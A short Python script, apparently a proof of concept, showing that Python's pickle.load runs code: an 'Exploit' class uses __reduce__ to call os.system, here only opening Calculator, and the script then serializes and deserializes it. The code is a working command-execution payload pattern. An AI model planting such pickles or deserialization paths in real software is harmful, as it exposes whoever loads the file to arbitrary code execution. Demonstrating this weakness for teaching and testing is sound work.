import pickle
import os

# Malicious payload
class Exploit:
    def __reduce__(self):
        return (os.system, ('open -a Calculator',))

object = Exploit()


# Serialization
with open('exploit.pickle', 'wb') as f:
    pickle.dump(object, f)

# Deserialization
with open('exploit.pickle', 'rb') as f:
    deserialized = pickle.load(f)

